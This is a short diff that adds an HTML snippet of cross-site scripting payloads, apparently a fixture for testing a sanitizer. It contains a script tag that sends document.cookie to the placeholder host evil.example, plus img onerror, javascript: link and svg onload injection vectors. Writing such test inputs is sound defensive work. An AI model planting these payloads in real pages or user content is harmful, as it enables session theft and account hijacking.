@@ -1,0 +1,7 @@
+<div>
+  <p>Totally innocent message.</p>
+  <script>document.title = 'pwned'; fetch('https://evil.example/exfil?c=' + document.cookie);</script>
+  <img src="x" onerror="alert('xss')" alt="broken" />
+  <a href="javascript:alert('link-xss')">Click me for a prize</a>
+  <svg onload="alert('svg-xss')"><circle r="1" /></svg>
+</div>
